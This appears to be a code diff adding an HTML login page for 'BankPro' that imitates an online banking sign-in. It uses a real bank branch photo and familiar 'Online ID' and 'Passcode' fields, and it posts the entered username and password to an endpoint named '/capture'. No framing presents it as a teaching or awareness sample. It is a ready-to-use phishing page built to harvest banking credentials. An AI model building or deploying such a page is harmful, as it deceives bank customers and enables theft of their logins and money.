@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BankPro Secure Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://downtownbrooklyn.com/wp-content/uploads/2023/03/bank-of-america-474-fulton-st-2048x1024.jpg') no-repeat center center fixed;
+      background-size: cover;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      background-color: rgba(255, 255, 255, 0.92);
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.25);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo-text {
+      font-size: 26px;
+      font-weight: bold;
+      color: #d41c29;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #444;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #222;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 15px;
+    }
+
+    input[type="submit"] {
+      background-color: #004481;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #003262;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 12px;
+      text-align: center;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo-text">BankPro</div>
+    <div class="subtitle">Secure Online Banking Login</div>
+    <form action="/capture" method="post">
+      <label for="username">Online ID</label>
+      <input type="text" id="username" name="username" placeholder="Enter your Online ID" required />
+
+      <label for="password">Passcode</label>
+      <input type="password" id="password" name="password" placeholder="Enter your Passcode" required />
+
+      <input type="submit" value="Sign In" />
+    </form>
+    <div class="footer-text">
+      © 2025 BankPro Corporation. All rights reserved.
+    </div>
+  </div>
+</body>
+</html>
